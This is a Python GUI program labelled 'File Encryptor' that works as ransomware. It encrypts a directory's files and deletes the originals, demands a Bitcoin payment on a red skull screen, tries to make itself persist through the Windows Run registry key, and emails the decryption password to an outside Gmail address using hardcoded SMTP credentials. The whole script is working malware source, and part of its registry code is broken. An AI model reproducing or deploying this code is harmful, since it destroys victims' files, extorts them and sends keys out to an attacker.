import os
import sys
import subprocess
from tkinter import filedialog, messagebox
import tkinter as tk
from tkinter import ttk
from cryptography.fernet import Fernet, InvalidToken
import secrets
import ctypes
import smtplib
from email.message import EmailMessage
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

class FileEncryptor:
    def __init__(self, master):
        self.master = master
        self.master.title("File Encryptor")
        self.master.geometry("1920x1080")  # Set initial size
        self.incorrect_attempts = 0
        self.max_attempts = 3
        # Set the icon for the application (replace 'skull_icon.png' with your icon file)
        icon_path = os.path.abspath('skull_icon.png')
        if os.path.exists(icon_path):
            self.master.iconphoto(True, tk.PhotoImage(file=icon_path))

        # Set red background color
        self.master.configure(bg="red")

        # Define the directory to be encrypted
        self.directory_to_encrypt = "/home/pc-3s/Downloads/encrypt/"  # Update with your directory path

        # Specify the path to the password file
        self.password_file_path = "/home/pc-3s/Downloads/python/password.txt"  # Update with your desired path

        # Generate and save a random password if the password file doesn't exist
        if not os.path.exists(self.password_file_path):
            random_password = self.generate_and_save_password()

        # Read the random password from the file
        with open(self.password_file_path, "r") as password_file:
            random_password = password_file.read()

        # Hardcoded password for demonstration purposes
        self.hardcoded_password = random_password.encode()
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)

        # Encrypt the files within the predefined directory
        self.encrypt_directory()

        # Create a themed style for a more appealing design
        self.style = ttk.Style()
        self.style.theme_use("clam")  # You can try other themes like 'alt', 'vista', 'xpnative', etc.

        # Load and resize the skull icon
        skull_icon = tk.PhotoImage(file="skull_icon.png")  # Replace with the path to your skull icon
        skull_icon = skull_icon.subsample(5, 5)  # Adjust the subsample values to resize
        skull_label = ttk.Label(master, image=skull_icon, background="red")
        skull_label.image = skull_icon
        skull_label.pack(pady=10)

        # Create and configure labels and entry widgets
        ttk.Label(master, text="Enter password:", background="red", foreground="white").pack(pady=5)
        self.password_entry = ttk.Entry(master, show="*")
        self.password_entry.pack(pady=5)

        # Create and configure buttons
        decrypt_button = ttk.Button(master, text="Decrypt", command=self.decrypt_directory)
        decrypt_button.pack(pady=10)

        # Create and configure payment label
        payment_label = ttk.Label(master, text="Pay 0.01235489 BTC to 'cheeth'", background="red", foreground="black", font=("Arial", 12, "bold"))
        payment_label.pack(pady=10)

        # Check if the script is running with administrative privileges
        if self.is_admin():
            self.add_to_startup()

        # Send the email with the password file
        self.send_email()

    def is_admin(self):
        try:
            # Check if the script is running on Windows
            if os.name == 'nt':
                # Check if the user has administrative privileges
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                # Non-Windows systems may use a different method to check for administrative privileges
                # You may need to customize this part based on the specifics of the system
                # This is just a placeholder and may not work on all non-Windows systems
                return os.getuid() == 0
        except AttributeError:
            return False  # 'ctypes' module does not have 'windll' attribute

    def generate_and_save_password(self):
        # Generate a strong random password
        random_password = secrets.token_urlsafe(16)

        # Save the password to the specified file
        with open(self.password_file_path, "w") as password_file:
            password_file.write(random_password)

        return random_password

    def encrypt_directory(self):
        cipher_password = self.cipher.encrypt(self.hardcoded_password)

        for filename in os.listdir(self.directory_to_encrypt):
            file_path = os.path.join(self.directory_to_encrypt, filename)

            if os.path.isfile(file_path):
                with open(file_path, "rb") as file:
                    data = file.read()
                    encrypted_data = self.cipher.encrypt(data)

                with open(file_path + ".enc", "wb") as encrypted_file:
                    encrypted_file.write(cipher_password + encrypted_data)

                # Remove the original unencrypted file
                os.remove(file_path)

        print(f"Directory '{self.directory_to_encrypt}' encrypted successfully.")

    def decrypt_directory(self):
        entered_password = self.password_entry.get().encode()

        try:
            # Check if the entered password matches the randomly generated password
            if entered_password == self.hardcoded_password:
                self.incorrect_attempts = 0
                for filename in os.listdir(self.directory_to_encrypt):
                    file_path = os.path.join(self.directory_to_encrypt, filename)

                    if file_path.endswith(".enc") and os.path.isfile(file_path):
                        with open(file_path, "rb") as encrypted_file:
                            encrypted_data = encrypted_file.read()
                            decrypted_data = self.cipher.decrypt(
                                encrypted_data[len(self.cipher.encrypt(self.hardcoded_password)):])

                        with open(file_path[:-4], "wb") as decrypted_file:
                            decrypted_file.write(decrypted_data)

                        # Remove the encrypted file
                        os.remove(file_path)

                print(f"Directory '{self.directory_to_encrypt}' decrypted successfully.")

                # Display success message
                messagebox.showinfo("Success", "Files decrypted successfully. Be aware next time!")
            else:
                self.incorrect_attempts += 1
                # Display popup error message
                messagebox.showerror("Error", "Incorrect password. Please try again.")
                print("Incorrect password. Directory decryption failed.")
                if self.incorrect_attempts >= self.max_attempts:
                    # If max attempts reached, execute another Python code
                    self.execute_another_code()
        except InvalidToken:
            print("Invalid token. Directory decryption failed. Check if the password is correct.")

    def execute_another_code(self):
        print("Max incorrect attempts reached. Executing another Python code.")
        try:
            subprocess.Popen([sys.executable, "closing.py"])
        except Exception as e:
            print(f"Failed to execute closing.py: {e}")

    def add_to_startup(self):
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        script_path = os.path.abspath(sys.argv[0])

        try:
            # Open the registry key
            hkey = ctypes.windll.winreg.OpenKey(ctypes.windll.winreg.HKEY_CURRENT_USER, key, 0,                                 
                                                ctypes.windll.winreg.KEY_SET_VALUE)

            # Set the registry value
            ctypes.windll.winreg.SetValueEx(hkey, "FileEncryptor", 0, ctypes.windll.winreg.REG_SZ, script_path)

            # Close the registry key
            ctypes.windll.winreg.CloseKey(hkey)

            print("Added to startup successfully.")
        except Exception as e:
            print(f"Error adding to startup: {e}")

    def send_email(self):
        print("Sending email with password file... please wait!")
        msg = MIMEMultipart()
        msg['Subject'] = 'Password File'
        msg['From'] = 'lillisette.rose@gmail.com'
        msg['To'] = 'lillisette.rose@gmail.com'

        part = MIMEBase('application', "octet-stream")
        part.set_payload(open(self.password_file_path, "rb").read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(self.password_file_path)}"')
        msg.attach(part)

        try:
            server = smtplib.SMTP('smtp.mailersend.net', 2525)
            server.starttls()
            server.login('MS_ZUPkt3@test-68zxl27zd7e4j905.mlsender.net', 'mssp.CktsrzT.0r83ql3dnmvgzw1j.VaUd6Yq')  # Replace with actual password
            server.send_message(msg)
            server.quit()
            print("Email sent successfully")
        except smtplib.SMTPException as e:
            print(f"Error sending email: {e}")

if __name__ == "__main__":
    root = tk.Tk()
    app = FileEncryptor(root)
    root.mainloop()